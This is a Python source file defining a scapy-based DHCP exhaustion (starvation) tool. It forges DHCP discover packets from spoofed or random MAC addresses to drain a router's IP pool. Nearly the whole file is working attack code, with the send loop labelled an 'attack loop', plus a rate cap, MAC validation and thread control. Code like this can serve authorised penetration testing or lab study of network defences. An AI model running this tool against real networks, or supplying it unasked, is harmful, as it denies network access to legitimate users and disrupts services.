import random
import re
import logging
import threading
import time
from collections import deque
from typing import List, Optional

from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Packet
from scapy.sendrecv import sendp
from scapy.arch import get_if_list


class DHCPExhaustion:
    """Simulate multiple DHCP clients to exhaust router's IP pool"""

    MAX_PPS: int = 100  # Class-wide safety limit

    def __init__(
        self,
        interface: str,
        num_devices: int = 50,
        request_options: Optional[List[int]] = None,
        client_src: Optional[List[str]] = None,
    ):
        self.interface = interface
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.logger = logging.getLogger(self.__class__.__name__)
        self._validate_interface()

        if num_devices < 1:
            raise ValueError("Number of devices must be at least 1")
        self.num_devices = num_devices
        self.request_options = request_options or list(range(81))
        self.client_src: List[str] = self._validate_macs(client_src) if client_src else []
        self.mac_pool: deque[str] = deque(self.client_src)
        self.sent_macs: set[str] = set()
        self.lock = threading.Lock()

    def _validate_interface(self) -> None:
        """Verify network interface exists."""
        if self.interface not in get_if_list():
            raise ValueError(
                f"Interface '{self.interface}' not found. " f"Available interfaces: {get_if_list()}"
            )

    def _rate_limit(self, pps: int) -> int:
        """Enforce packets-per-second safety limit."""
        if pps > self.MAX_PPS:
            self.logger.warning(
                f"Requested {pps} pps exceeds safety limit {self.MAX_PPS}. "
                f"Capping at {self.MAX_PPS} pps."
            )
            return self.MAX_PPS
        return pps

    def _validate_macs(self, mac_list: List[str]) -> List[str]:
        """Validate and normalize MAC addresses"""
        validated = []
        pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"

        for idx, mac in enumerate(mac_list):
            if not re.match(pattern, mac):
                raise ValueError(
                    f"Invalid MAC #{idx + 1}: '{mac}'\n"
                    "Valid format: '01:23:45:67:89:ab' or '01-23-45-67-89-ab'"
                )
            validated.append(mac.lower().replace("-", ":"))
        return validated

    def _generate_mac(self) -> str:
        """Generate MAC from pool or randomly"""
        if self.mac_pool:
            mac = self.mac_pool[0]
            self.mac_pool.rotate(-1)
            return mac
        while True:
            mac = "de:ad:%02x:%02x:%02x:%02x" % (
                random.randint(0, 0xFF),
                random.randint(0, 0x7F),
                random.randint(0, 0xFF),
                random.randint(0, 0xFF),
            )
            if mac not in self.sent_macs:
                self.sent_macs.add(mac)
                return mac

    def _create_dhcp_packet(self) -> Packet:
        """Build DHCP discovery packet"""
        mac = self._generate_mac()
        return (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=68, dport=67)
            / BOOTP(chaddr=mac)
            / DHCP(
                options=[
                    ("message-type", "discover"),
                    ("client_id", mac),
                    ("param_req_list", self.request_options),
                    "end",
                ]
            )
        )

    def _send_loop(self) -> None:
        """Main attack loop with rate limiting"""
        try:
            sent_count = 0
            base_pps = max(1, self.num_devices)
            allowed_pps = self._rate_limit(base_pps)
            delay = 1.0 / allowed_pps

            while self.running and sent_count < self.num_devices:
                pkt = self._create_dhcp_packet()
                sendp(pkt, iface=self.interface, verbose=False)
                self.logger.info(
                    f"Sent DHCP request from {pkt.src} " f"({sent_count+1}/{self.num_devices})"
                )
                sent_count += 1
                time.sleep(delay)

            if sent_count >= self.num_devices:
                self.logger.info(f"Completed {self.num_devices} DHCP requests")
                self.stop()

        except Exception as e:
            self.logger.error(f"DHCP loop error: {str(e)}")
            self.stop()

    def start(self) -> None:
        """Launch attack thread"""
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._send_loop)
            self.thread.start()
            self.logger.info(f"Started DHCP exhaustion with {self.num_devices} devices")

    def stop(self) -> None:
        """Stop attack thread"""
        self.running = False
        if self.thread and self.thread.is_alive():
            if threading.current_thread() is not self.thread:
                self.thread.join(timeout=5)
                if self.thread.is_alive():
                    self.logger.error("DHCP thread failed to stop")
        self.logger.info("DHCP exhaustion stopped")

    def user_abort(self) -> None:
        """Public method for signal handlers."""
        self.logger.info("User requested graceful shutdown")
        self.stop()

    def __enter__(self) -> "DHCPExhaustion":
        self.start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        self.stop()
